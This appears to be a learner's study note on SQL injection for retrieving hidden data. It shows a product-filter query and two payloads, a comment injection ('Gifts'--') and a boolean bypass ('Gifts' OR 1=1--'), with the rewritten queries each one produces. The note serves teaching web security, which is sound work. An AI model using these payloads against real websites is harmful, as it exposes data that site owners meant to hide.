Retrieving Hidden Data
Example Scenario
Website URL:
Plain text
/products?category=Gifts
Backend query:
SQL
SELECT * FROM products 
WHERE category='Gifts' 
AND released=1
Query Meaning
retrieve all product data
only from Gifts category
only released products
Attack 1 — Comment Injection
Payload:
SQL
Gifts'--
Modified query:
SQL
SELECT * FROM products 
WHERE category='Gifts'--' 
AND released=1
Result
-- comments out remaining query.
Effective query:
SQL
SELECT * FROM products 
WHERE category='Gifts'
Attack 2 — Boolean Manipulation
Payload:
SQL
Gifts' OR 1=1--
Modified query:
SQL
SELECT * FROM products 
WHERE category='Gifts' 
OR 1=1--'
Since 1=1 is always TRUE:
all products may be returned
Important Concepts
SQL Comments
SQL
--
Used to ignore remaining query parts.
Boolean Logic
SQL
1=1 → TRUE
1=2 → FALSE
Main Learning
Learned:
hidden data exposure
comment injection
boolean manipulation
backend query execution flow
